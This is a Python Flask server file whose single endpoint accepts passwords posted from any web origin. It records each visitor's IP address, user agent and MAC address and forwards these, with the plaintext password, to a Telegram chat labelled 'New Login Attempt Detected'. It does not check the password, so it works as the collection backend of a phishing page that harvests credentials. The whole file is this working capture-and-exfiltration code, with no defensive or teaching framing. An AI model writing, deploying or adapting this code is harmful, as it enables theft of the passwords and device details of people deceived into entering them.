from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
from datetime import datetime
from dotenv import load_dotenv
import os
import subprocess

# Load environment variables from .env
load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

if not BOT_TOKEN or not CHAT_ID:
    raise ValueError("BOT_TOKEN or CHAT_ID is missing. Check your .env file.")

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}})  # Allow all origins for testing

def get_mac_address(ip):
    """Get MAC address of a device based on its IP."""
    try:
        result = subprocess.run(["arp", "-a", ip], capture_output=True, text=True)
        if result.returncode == 0:
            for line in result.stdout.splitlines():
                if ip in line:
                    return line.split()[1]  # Extract MAC address
    except Exception as e:
        print(f"Error getting MAC address: {e}")
    return "Unknown MAC"

def send_telegram_message(message):
    """Send a message to Telegram."""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        }
        response = requests.post(url, json=payload)
        if response.status_code != 200:
            print(f"Failed to send Telegram message: {response.text}")
    except Exception as e:
        print(f"Error sending Telegram message: {e}")

@app.route('/save_data', methods=['POST', 'OPTIONS'])
def save_data():
    """Handle saving data and preflight requests."""
    if request.method == 'OPTIONS':
        # Handle preflight request
        response = jsonify({"status": "success", "message": "Preflight request handled."})
        response.headers.add("Access-Control-Allow-Origin", "*")
        response.headers.add("Access-Control-Allow-Headers", "Content-Type")
        response.headers.add("Access-Control-Allow-Methods", "POST, OPTIONS")
        return response

    try:
        # Extract data from the request
        data = request.json
        if not data:
            raise ValueError("No data received in the request.")
        
        password = data.get('password', '')
        if not password:
            raise ValueError("Password is missing.")

        # Additional information
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        ip_address = request.remote_addr
        user_agent = request.headers.get('User-Agent', 'Unknown')
        mac_address = get_mac_address(ip_address)

        # Prepare Telegram message
        message = (
            f"🌐 *New Login Attempt Detected*:\n"
            f"🕒 Timestamp: `{timestamp}`\n"
            f"🌍 IP Address: `{ip_address}`\n"
            f"📱 User-Agent: `{user_agent}`\n"
            f"🔑 Password: `{password}`\n"
            f"🔗 MAC Address: `{mac_address}`"
        )
        send_telegram_message(message)

        return jsonify({"status": "success", "message": "Data received and processed"}), 200

    except Exception as e:
        print(f"Error in save_data: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route('/')
def home():
    return jsonify({"status": "success", "message": "Welcome to the service"}), 200


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
